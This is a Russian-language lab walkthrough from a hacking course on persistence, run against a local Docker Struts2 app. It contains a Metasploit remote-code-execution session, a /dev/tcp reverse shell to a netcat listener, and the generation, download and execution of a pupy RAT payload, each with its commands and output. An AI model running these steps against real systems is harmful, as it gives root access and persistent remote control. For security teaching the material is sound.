# Подготовка 
ВМ Kali установка docker.io и docker-compose

Скачать 
https://cybered-my.sharepoint.com/personal/v_karmanov_cyber-ed_ru/_layouts/15/onedrive.aspx?id=%2Fpersonal%2Fv%5Fkarmanov%5Fcyber%2Ded%5Fru%2FDocuments%2F%D0%9F%D1%80%D0%BE%D1%84%D0%B5%D1%81%D1%81%D0%B8%D1%8F%20%D0%A5%D0%B0%D0%BA%D0%B5%D1%80%2E%20%D0%9F%D1%80%D0%B0%D0%BA%D1%82%D0%B8%D0%BA%D0%B0%2F7%20%D0%97%D0%B0%D0%BA%D1%80%D0%B5%D0%BF%D0%BB%D0%B5%D0%BD%D0%B8%D0%B5%20%D0%B4%D0%BE%D1%81%D1%82%D1%83%D0%BF%D0%B0%2Fpersistence%2Dlab%2Ezip&parent=%2Fpersonal%2Fv%5Fkarmanov%5Fcyber%2Ded%5Fru%2FDocuments%2F%D0%9F%D1%80%D0%BE%D1%84%D0%B5%D1%81%D1%81%D0%B8%D1%8F%20%D0%A5%D0%B0%D0%BA%D0%B5%D1%80%2E%20%D0%9F%D1%80%D0%B0%D0%BA%D1%82%D0%B8%D0%BA%D0%B0%2F7%20%D0%97%D0%B0%D0%BA%D1%80%D0%B5%D0%BF%D0%BB%D0%B5%D0%BD%D0%B8%D0%B5%20%D0%B4%D0%BE%D1%81%D1%82%D1%83%D0%BF%D0%B0&ga=1

или 

https://disk.yandex.ru/d/HPc2quwEOko_6g

Распаковать данный архив и перейти в появившуюся директорию  persistance-lab-prod в терминальной оболочке вашей ОС.
Выполнить команду:
docker-compose up -d

По адресу http://localhost:1337 появится приложение лабораторного стенда.

# Execution (Эксплуатация)
Metasploit framework

msf6 > use exploit/multi/http/struts2_code_exec_showcase
[*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/struts2_code_exec_showcase) > set RHOSTS localhost
RHOSTS => localhost
msf6 exploit(multi/http/struts2_code_exec_showcase) > set rport 1337
rport => 1337
msf6 exploit(multi/http/struts2_code_exec_showcase) >  set TARGETURI /integration/saveGangster.action
TARGETURI => /integration/saveGangster.action
msf6 exploit(multi/http/struts2_code_exec_showcase) >  set PAYLOAD cmd/unix/generic
PAYLOAD => cmd/unix/generic
msf6 exploit(multi/http/struts2_code_exec_showcase) > set CMD id
CMD => id
msf6 exploit(multi/http/struts2_code_exec_showcase) > exploit 
[*] Exploiting target ::1

[+] Command executed
uid=0(root) gid=0(root) groups=0(root)

# работает

# Запускаем прослушивание порта 9004 на машине атакующего
└─$ nc -lvp 9004

# ввод новой команды - создаем службу в ОС которая будет соеденятся с машиной атакующего по порту 9004
# 
msf6 exploit(multi/http/struts2_code_exec_showcase) > set CMD 'sh -I >& /dev/tcp/172.18.0.1/9004 0>&1'
CMD => sh -I >& /dev/tcp/172.18.0.1/9004 0>&1
msf6 exploit(multi/http/struts2_code_exec_showcase) > exploit 

# почему IP 172.18.0.1. Потому что запустив ip a мы получим результат, где  br-0cd226f21448: это docker
4: br-0cd226f21448: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:6a:cd:ac:cf brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-0cd226f21448
       valid_lft forever preferred_lft forever
    inet6 fe80::42:6aff:fecd:accf/64 scope link proto kernel_ll 
       valid_lft forever preferred_lft forever

# соединение установлено
listening on [any] 9004 ...
172.18.0.3: inverse host lookup failed: Unknown host
connect to [172.18.0.1] from (UNKNOWN) [172.18.0.3] 50428

id
uid=0(root) gid=0(root) groups=0(root)

# Теперь, когда соединение установлено, можно начать подготовку к запуску клиентской части pupy для более удобного управления скомпрометированной машиной.
# генерация ssh ключа без пароля
─$ ssh-keygen -t rsa -b 2048 -N "" -f ~/.ssh/id_rsa

#  Для работы с pupy необходимо добавить свой SSH-ключ в доверенные:
cp ~/.ssh/id_rsa.pub /tmp/projects/keys/authorized_keys

Подключимся к интерфейсу сервера pupy:
# почему 127.0.0.1, машина развернута на localhost с портами 1337 (web-морда) и 2022 (ssh server)
$ ssh -I ~/.ssh/id_rsa -p 2022 pupy@127.0.0.1
# Далее в этой сессии генерируем payload, воспользуемся командой gen:
# Справка по gen:
>> gen -h
# Создаем нагрузку под ОС Linux с архитектурой x64:
>> gen -f client -O linux -A x64 connect

# В нашем примере файл появится в /tmp/projects/default/output/pupyx64.RygkKI.lin

# Бинарный файл появляется в директории /projects/default/output, затем необходимо передать его на скомпрометированный узел с помощью веб-сервера, встроенного в python.

# На машине атакующего переходим в директорию с файлом:
cd /tmp/projects/default/output

# Запускаем сервер:
python3 -m http.server 3000

# На скомпрометированном узле выполняем команду: (терминал с nc -lvp 9004)

wget http://172.20.10.7:3000/pupyx64.RygkKI.lin # IP-адрес и название файла нужно определить по выводу предыдущих команд
# ждем загрузки
# Дадим файлу права на исполнение:
chmod +x pupy* 
# * заменяется на все файлы, начинающиеся с pupy
# Выполним файл и подождем его подключения серверу RAT:
./pupy*


*********************************** pupy RAT ****************************************
https://telegra.ph/Pupy--sredstvo-udalennogo-dostupa-v-Linux-11-24
https://hackware.ru/?p=8853
*************************************************************************************




# FLAG 
hostname       fb989e2e61e6                                           
user           root                                                   
release        6.6.9-amd64                                            
version        #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08)  
cmdline        ./pupyx64.RygkKI.lin                                   
os_arch        x86_64                                                 
proc_arch      64bit                                                  
pid            64                                                     
exec_path      /usr/local/tomcat/pupyx64.RygkKI.lin                   
cid            00000000453ce861                                       
address        172.18.0.3                                             
macaddr        02:42:ac:12:00:03                                      
revision       ?                                                      
node           0242ac120003                                           
debug_logfile  ?                                                      
native         True                                                   
proxy          wpad                                                   
external_ip    ?                                                      
launcher       connect                                                
launcher_args  -t ssl --host 172.18.0.2:8443                          
platform       linux/amd64 
